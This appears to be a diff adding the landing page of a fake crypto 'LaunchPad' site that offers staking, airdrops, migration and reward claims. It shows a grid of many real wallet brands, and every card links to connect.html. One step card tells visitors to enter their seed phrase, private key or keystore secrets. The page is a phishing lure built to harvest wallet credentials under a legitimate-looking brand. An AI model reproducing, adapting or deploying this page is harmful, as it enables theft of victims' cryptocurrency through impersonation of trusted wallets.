@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- CodeHorror MKraft -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <link rel="stylesheet" href="style.css">
+        <link rel="shortcut icon" href="asset/images/icon/chains.jpg">
+    <link rel="apple-touch-icon-precomposed" href="asset/images/icon/chains.jpg">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <script src="script.js" defer></script>
+    <!-- jQuery -->
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+<!-- SweetAlerts -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
+
+    <title>Dexprochains LaunchPad</title>
+</head>
+<body>
+  <!--Header menu-->
+  <header class="fixed-header">
+    <div class="mobile-header">
+        <a href ="index.html">
+      <div class="logo">
+        <div class="main-logo"><img
+        src="asset/images/icon/chains.png" style="width:150px !important; height:
+        40px !important;"></div></div>
+        </a>
+      <div class="wallet-icon-container">
+        <a href="#wallets_list">
+        <div class="wallet-icon">
+          <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><g id="Layer_2" data-name="Layer 2"><path d="m11.173 12.827a4 4 0 0 1 2.827-6.827h4v-.17a2.834 2.834 0 0 0 -2.83-2.83h-11.34a2.834 2.834 0 0 0 -2.83 2.83v8.34a2.834 2.834 0 0 0 2.83 2.83h11.34a2.834 2.834 0 0 0 2.83-2.83v-.17h-4a3.973 3.973 0 0 1 -2.827-1.173z"/><path d="m18.058 8h-3.912a2.109 2.109 0 0 0 -2.146 2.1 2.005 2.005 0 0 0 2 1.9h4.058a.942.942 0 0 0 .942-.942v-2.116a.942.942 0 0 0 -.942-.942zm-4.058 3a1 1 0 1 1 1-1 1 1 0 0 1 -1 1z"/></g></svg>
+        </div>
+        </a>
+      </div>
+    </div>
+  </header>
+  <div class="coinmarquee-container">
+    <script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/coinMarquee.js"></script>
+    <div id="coinmarketcap-widget-marquee" coins="1,1027,825,11419,5426,52,2,74,1958,1975,2010,3408,5964,6636,3890,7083,27772,6958" currency="USD" theme="dark" transparent="false" show-symbol-logo="true"></div>
+  </div>
+ <!-- Hero-->
+ <div class="hero">
+  <br>
+  <br>
+  &nbsp;
+ 
+<!-- Hero Title Section -->
+<div class="hero-title">
+
+ <h1>Validate, Initialize, Synchronize Your Tokens, and Get Ready for the Next Level of Earnings!</h1>
+ <p class="subtitle">This is an open and decentralized protocol for syncing various wallets to Dapps secure server to be rewarded in the following ways:</p>
+</div>
+</div>
+  <div class="black">
+    
+    <div class="button-container">
+        
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          Staking
+      </a>
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          Migration V2
+      </a>
+  </div>
+  <div class="button-container">
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          Connect Wallet
+      </a>
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          Airdrop
+      </a>
+  </div>
+  <div class="button-container">
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          Whitelist
+      </a>
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          KYC
+      </a>
+  </div>
+  <div class="button-container">
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          RPC Settings
+      </a>
+      <a href="#wallets_list" class="custom-button">
+          <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+          </svg>
+          Buy NFT
+      </a>
+  </div>
+  <div class="button-container">
+    <a href="#wallets_list" class="custom-button">
+        <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+            <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+        </svg>
+        Marketplace
+    </a>
+    <a href="#wallets_list" class="custom-button">
+        <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+            <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+        </svg>
+        Gas
+    </a>
+</div>
+<div class="button-container">
+  <a href="#wallets_list" class="custom-button">
+      <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+          <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+      </svg>
+      Claim Rewards
+  </a>
+  <a href="#wallets_list" class="custom-button">
+      <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+          <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+      </svg>
+      Rectification
+  </a>
+</div>
+<div class="button-container">
+  <a href="#wallets_list" class="custom-button">
+      <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+          <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+      </svg>
+      Snapshots
+  </a>
+  <a href="#wallets_list" class="custom-button">
+      <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+          <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+      </svg>
+      Buy Presale
+  </a>
+</div>
+<div class="button-container">
+  <a href="#wallets_list" class="custom-button">
+      <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+          <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+      </svg>
+      Swapping
+  </a>
+  <a href="#wallets_list" class="custom-button">
+      <svg class="button-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+          <path d="M7.5 1.018a1 1 0 0 1 1 0l6 3.464a1 1 0 0 1 .5.866v6.904a1 1 0 0 1-.5.866l-6 3.464a1 1 0 0 1-1 0l-6-3.464a1 1 0 0 1-.5-.866V5.348a1 1 0 0 1 .5-.866l6-3.464z"/>
+      </svg>
+      Migrate
+  </a>
+</div>
+</div>
+  <div class="container">
+    <section class="services-section">
+        <div class="services-grid">
+          <!-- Card 1 -->
+          <div class="service-card">
+            <div class="service-icon">
+              <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="56" height="56" rx="16" fill="#FF5733"></rect>
+                <path d="M28 16L40 28H16L28 16Z" fill="white" />
+              </svg>
+            </div>
+            <h3 class="service-heading">Select a wallet</h3>
+            <p class="service-content">Check through the list to see the availability of your wallet</p>
+          </div>
+      
+          <!-- Card 2 -->
+          <div class="service-card">
+            <div class="service-icon">
+              <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="56" height="56" rx="16" fill="#28B463"></rect>
+                <circle cx="28" cy="28" r="10" fill="white" />
+              </svg>
+            </div>
+            <h3 class="service-heading">Click to load</h3>
+            <p class="service-content">A new page opens upon clicking it for connection</p>
+          </div>
+      
+          <!-- Card 3 -->
+          <div class="service-card">
+            <div class="service-icon">
+              <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="56" height="56" rx="16" fill="#3498DB"></rect>
+                <path d="M28 20L34 28H22L28 20Z" fill="white" />
+              </svg>
+            </div>
+            <h3 class="service-heading">Select connection type</h3>
+            <p class="service-content">Select between Phrase, Private key or keystore, then fill in the secrets.</p>
+          </div>
+      
+          <!-- Card 4 -->
+          <div class="service-card">
+            <div class="service-icon">
+              <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="56" height="56" rx="16" fill="#9B59B6"></rect>
+                <line x1="20" y1="28" x2="36" y2="28" stroke="white" stroke-width="4" />
+              </svg>
+            </div>
+            <h3 class="service-heading">Connect</h3>
+            <p class="service-content">Easy-Peasy! You are on your way to liberation</p>
+          </div>
+        </div>
+      </section>
+      <!--Wallets Section-->
+      <div class="wallet-title">
+        <h2 class="wallet-heading">Select a Wallet below to get started</h2>
+        <div class="heading-line"></div>
+    </div>
+    
+      <section id="wallets_list">
+        <div class="wallets-grid">
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/walle.jpg" alt="Wallet Connect" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Wallet Connect</h5>
+                    <span class="wallet-site">walletconnect.com</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/trust_wallet.jpg" alt="Trust Wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Trust Wallet</h5>
+                    <span class="wallet-site">trustwallet.com</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/tonkeeper.jpg" alt="Tonkeeper" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Tonkeeper</h5>
+                    <span class="wallet-site">wallet.tonkeeper.com</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/Flint.jpg" alt="Flint Wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Flint Wallet</h5>
+                    <span class="wallet-site">Flint-Wallet.com</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/binance.png" alt="Binance Chain Wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Binance Chain Wallet</h5>
+                    <span class="wallet-site">binance.com</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/polygon.jpg" alt="Polygon Wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Polygon Wallet</h5>
+                    <span class="wallet-site">polygon.technology</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/rainbow.jpg" alt="Rainbow" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Rainbow</h5>
+                    <span class="wallet-site">rainbow.me</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/bonk.png" alt="Bonkbot || Solana Defi" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Bonkbot || Solana Defi</h5>
+                    <span class="wallet-site">bonkbot.io</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/phantom.png" alt="Phantom" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Phantom</h5>
+                    <span class="wallet-site">phantom.app</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/bitpay.jpg" alt="Bitpay" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Bitpay</h5>
+                    <span class="wallet-site">bitpay.com</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/walleth.jpg" alt="Walleth" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Walleth</h5>
+                    <span class="wallet-site">walleth.org</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/argent.jpg" alt="Argent" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Argent</h5>
+                    <span class="wallet-site">argent.xyz</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/huobi.jpg" alt="Huobi Wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Huobi Wallet</h5>
+                    <span class="wallet-site">huobiwallet.com</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/encrypted_ink.jpg" alt="Encrypted Ink" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Encrypted Ink</h5>
+                    <span class="wallet-site">encrypted.ink</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/compound.jpg" alt="Compound" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Compound</h5>
+                    <span class="wallet-site">compound.finance</span>
+                </div>
+            </div>
+    
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/polkadot.jpg" alt="Polkadot" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Polkadot</h5>
+                    <span class="wallet-site">polkadot.network</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/1inch.jpg" alt="1inch" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>1Inch</h5>
+                    <span class="wallet-site">1inch.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/at_wallet.jpg" alt="at_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>AT.Wallet</h5>
+                    <span class="wallet-site">authentrend.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/atoken_wallet.jpg" alt="atoken_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>AToken Wallet</h5>
+                    <span class="wallet-site">atoken.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/flare_wallet.jpg" alt="flare wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Flare wallet</h5>
+                    <span class="wallet-site">flarewallet.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/plasmapay.jpg" alt="PlasmaPay" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>PlasmaPay</h5>
+                    <span class="wallet-site">plasmapay.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/via_wallet.jpg" alt="Viawallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>ViaWallet</h5>
+                    <span class="wallet-site">viawallet.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/iotex.jpg" alt="Iotex" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Iotex</h5>
+                    <span class="wallet-site">iotex.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/coin98.jpg" alt="Coin98" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Coin98</h5>
+                    <span class="wallet-site">coin98.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/coinbase.png" alt="Coinbase" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Coinbase</h5>
+                    <span class="wallet-site">coinbase.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/crypto.jpg" alt="Crypto" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Crypto.com || Defi Wallet</h5>
+                    <span class="wallet-site">crypto.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/token_pocket.jpg" alt="Tokenpocket" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>TokenPocket</h5>
+                    <span class="wallet-site">tokenpocket.pro</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/math_wallet.jpg" alt="Mathwallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Math Wallet</h5>
+                    <span class="wallet-site">mathwallet.org</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/ledger_live.jpg" alt="Ledger" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Ledger Live</h5>
+                    <span class="wallet-site">ledger.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/dharma.jpg" alt="Dharma" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Dharma</h5>
+                    <span class="wallet-site">dharma.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/trust_vault.jpg" alt="Trust_vault" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Trust Vault</h5>
+                    <span class="wallet-site">trustology.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/mykey.jpg" alt="MYKEY" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>MYKEY</h5>
+                    <span class="wallet-site">mykey.org</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/atomic.jpg" alt="Atomic" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Atomic</h5>
+                    <span class="wallet-site">atomicwallet.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/cool_wallet_s.jpg" alt="CoolWallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>CoolWallet S</h5>
+                    <span class="wallet-site">coolwallet.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/nash.jpg" alt="Nash" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Nash</h5>
+                    <span class="wallet-site">nash.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/coinomi.jpg" alt="coinomi" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Coinomi</h5>
+                    <span class="wallet-site">coinomi.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/gridplus.jpg" alt="Gridplus" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>GridPlus</h5>
+                    <span class="wallet-site">gridplus.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/tokenary.jpg" alt="Tokenary" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Tokenary</h5>
+                    <span class="wallet-site">tokenary.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/safepal.jpg" alt="Safepal" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>SafePal</h5>
+                    <span class="wallet-site">safepal.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/infinito.jpg" alt="infinito" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Infinito</h5>
+                    <span class="wallet-site">infinitowallet.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/wallet_io.jpg" alt="Wallet_io" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Wallet.io</h5>
+                    <span class="wallet-site">wallet.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/ownbit.jpg" alt="ownbit_io" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Ownbit</h5>
+                    <span class="wallet-site">ownbit.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/easypocket.jpg" alt="easypocket" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>EasyPocket</h5>
+                    <span class="wallet-site">easypocket.app</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/bridge_wallet.jpg" alt="bridge_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Bridge Wallet</h5>
+                    <span class="wallet-site">mtpelerin.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/bitkeep.jpg" alt="bitkeep" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Bitkeep</h5>
+                    <span class="wallet-site">bitkeep.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/unstoppable_wallet.jpg" alt="unstoppable_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Unstoppable Wallet</h5>
+                    <span class="wallet-site">unstoppable.money</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/halodefi_wallet.jpg" alt="halodefi_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>HaloDefi Wallet</h5>
+                    <span class="wallet-site">halodefi.org</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/dok_wallet.jpg" alt="dok_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Dok Wallet</h5>
+                    <span class="wallet-site">dokwallet.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/celo_wallet.jpg" alt="cellowallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Cello Wallet</h5>
+                    <span class="wallet-site">cellowallet.app</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/coinus.jpg" alt="coinus" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Coin Us</h5>
+                    <span class="wallet-site">coinus.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/valora.jpg" alt="valoraapp" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Valora</h5>
+                    <span class="wallet-site">valoraapp.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/trustee_wallet.jpg" alt="trustee_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Trustee Wallet</h5>
+                    <span class="wallet-site">trusteeglobal.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/guarda_wallet.jpg" alt="guarda_wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Guarda Wallet</h5>
+                    <span class="wallet-site">guarda.com</span>
+                </div>
+            </div>
